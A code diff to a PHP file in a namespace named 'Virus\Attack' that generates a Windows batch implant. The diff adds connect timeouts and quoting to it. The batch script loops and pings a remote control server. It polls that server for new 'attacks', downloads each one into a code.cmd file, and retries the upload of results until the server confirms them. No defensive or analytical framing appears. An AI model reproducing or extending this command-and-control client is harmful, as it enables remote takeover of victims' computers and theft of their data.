@@ -1,4 +1,4 @@
-<?php
+<?php /** @noinspection SpellCheckingInspection */
 
 namespace Kelvinho\Virus\Attack {
 
@@ -22,15 +22,15 @@ namespace Kelvinho\Virus\Attack {
             @echo off
             SetLocal EnableDelayedExpansion
 
-            rmdir -s -q %~dp0libs\current
-            mkdir %~dp0libs\current
+            rmdir /s /q "%~dp0libs\current"
+            mkdir "%~dp0libs\current"
 
             :daemon_loop
             timeout <?php echo VIRUS_PING_INTERVAL . "\n"; ?>
 
-            curl -L <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/ping
+            curl -L <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/ping --connect-timeout 5
 
-            for /f "tokens=*" %%i in ('curl -L <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks') do (
+            for /f "tokens=*" %%i in ('curl -L <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks --connect-timeout 5') do (
                 if exist "%~dp0libs\current\%%i" (cls) else (
                     mkdir "%~dp0libs\current\%%i"
                     >"%~dp0libs\current\%%i\code.cmd" curl -L <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks/%%i/code
@@ -449,7 +449,7 @@ namespace Kelvinho\Virus\Attack {
             if %trials% geq <?php echo ATTACK_UPLOAD_RETRIES; ?> goto end_payload_confirmation_loop
             <?php echo "$uploadCode\n"; ?>
             timeout <?php echo ATTACK_UPLOAD_RETRY_INTERVAL . "\n"; ?>
-            for /f "tokens=*" %%i in ('curl -L <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks') do if "%%i"=="<?php echo $attack_id; ?>" goto payload_confirmation_loop
+            for /f "tokens=*" %%i in ('curl -L <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks --connect-timeout 5') do if "%%i"=="<?php echo $attack_id; ?>" goto payload_confirmation_loop
             :end_payload_confirmation_loop
             EndLocal
             <?php return ob_get_clean();//@formatter:on
